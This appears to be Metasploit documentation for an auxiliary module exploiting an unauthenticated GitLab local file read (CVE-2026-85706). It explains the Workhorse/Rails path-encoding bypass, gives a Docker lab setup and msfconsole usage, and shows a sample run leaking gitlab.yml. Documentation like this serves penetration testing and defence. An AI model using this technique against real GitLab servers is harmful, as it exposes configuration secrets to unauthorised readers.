## Vulnerable Application

This module exploits CVE-2026-85706, an unauthenticated local file read in the GitLab repository commits and files APIs.
The issue affects GitLab CE and EE versions from 18.7 before 19.1.8, 19.2 before 19.2.6, and 19.3 before 19.3.2.

GitLab Workhorse normally preprocesses request bodies for the affected API routes. Workhorse matches the escaped URL path,
while Rails routes the decoded path. Encoding a character in a static route segment therefore lets the request reach Rails
without Workhorse rewriting attacker-controlled `file.path` upload metadata. The Rails handler reads that local path before
authentication.

The file disclosure channel has an important limitation: the file must contain a percent sign (`%`) that is not followed by
two hexadecimal characters. Parsing the file as URL-encoded form data then raises an error that includes a fragment of file
data leading up to the malformed percent sequence. URL-form delimiters such as `&` and `=` can further bound that fragment,
so this is not a dependable full-file download. Files without a malformed percent sequence are read by the server but their
contents are not returned. The default `FILEPATH` points to GitLab's `gitlab.yml`, whose comments contain suitable percent
sequences in a standard Omnibus installation.

The following command starts a vulnerable GitLab CE 19.3.1 Omnibus container. Allow several minutes for the first startup.

```bash
docker run --rm --name gitlab-cve-2026-85706 \
  --hostname gitlab.example.test \
  -p 8929:8929 \
  -e "GITLAB_OMNIBUS_CONFIG=external_url 'http://192.0.2.1:8929'" \
  gitlab/gitlab-ce:19.3.1-ce.0
```

Wait until the container reports healthy:

```bash
docker inspect --format '{{.State.Health.Status}}' gitlab-cve-2026-85706
```

No user account or project is required. The files API reads the requested path before validating the supplied project ID.

## Verification Steps

1. Start GitLab CE 19.3.1 as described above.
2. Start `msfconsole`.
3. Run `use auxiliary/gather/gitlab_file_read_cve_2026_85706`.
4. Run `set RHOSTS 192.0.2.1`.
5. Run `set RPORT 8929`.
6. Optionally set `FILEPATH` to another absolute path containing a malformed percent sequence.
7. Run `check`.
8. Run `run`.

The module's check first attempts to verify the file read directly. If that does not prove exploitation, it fingerprints the
GitLab version and compares the detected version range with the affected releases.

## Options

### FILEPATH

The absolute path to read. The file must be readable by the GitLab Rails process and must contain a percent sign not followed
by two hexadecimal characters for its contents to be returned.

### PROJECT_ID

The project ID placed in the API route. The default value is sufficient because the files endpoint reads the local file before
checking whether the project exists.
## Scenarios

### GitLab CE 19.3.1

```
msf auxiliary(gather/gitlab_file_read_cve_2026_85706) > set RHOSTS 192.0.2.1
RHOSTS => 192.0.2.1
msf auxiliary(gather/gitlab_file_read_cve_2026_85706) > set RPORT 8929
RPORT => 8929
msf auxiliary(gather/gitlab_file_read_cve_2026_85706) > check
[+] 192.0.2.1:8929 - The target is vulnerable. The target returned a GitLab application source file
msf auxiliary(gather/gitlab_file_read_cve_2026_85706) > run
[+] 192.0.2.1:8929 - Data from /opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml was read successfully and stored in: /loot/path/gitlab.yml
[*] Auxiliary module execution completed
```
